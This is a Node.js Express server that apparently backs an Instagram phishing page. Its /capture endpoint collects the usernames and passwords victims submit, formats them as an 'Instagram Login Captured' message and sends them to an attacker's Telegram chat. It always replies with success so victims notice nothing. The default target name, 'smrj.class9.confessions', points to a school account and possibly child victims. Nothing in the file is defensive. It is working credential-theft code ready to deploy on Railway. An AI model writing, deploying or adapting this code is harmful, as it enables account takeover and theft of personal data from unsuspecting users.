const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 8080;

// Use environment variables (recommended for Railway)
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!TELEGRAM_TOKEN || !CHAT_ID) {
    console.error("❌ ERROR: TELEGRAM_TOKEN or CHAT_ID is missing in environment variables!");
    console.error("Please add them in Railway Dashboard → Variables");
}

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));   // serves your html, css, etc.

app.post('/capture', async (req, res) => {
    const { username, password, target, time } = req.body || {};

    console.log(`[CAPTURED] Username: ${username || 'N/A'} | Password length: ${password ? password.length : 0}`);

    if (!username || !password) {
        return res.json({ success: true });
    }

    const message = `
<b>Instagram Login Captured</b> 🔥

<b>Username / Email:</b> ${username}
<b>Password:</b> <code>${password}</code>
<b>Target:</b> ${target || "smrj.class9.confessions"}
<b>Time:</b> ${time ? new Date(time).toLocaleString() : new Date().toLocaleString()}
    `.trim();

    if (TELEGRAM_TOKEN && CHAT_ID) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "HTML"
                })
            });

            if (response.ok) {
                console.log("✅ Sent to Telegram successfully");
            } else {
                const errorText = await response.text();
                console.error(`❌ Telegram API Error ${response.status}:`, errorText);
            }
        } catch (err) {
            console.error("❌ Failed to connect to Telegram:", err.message);
        }
    } else {
        console.error("❌ Telegram credentials not set - message not sent");
    }

    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📨 Telegram bot ready - Chat ID: ${CHAT_ID || 'NOT SET'}`);
});
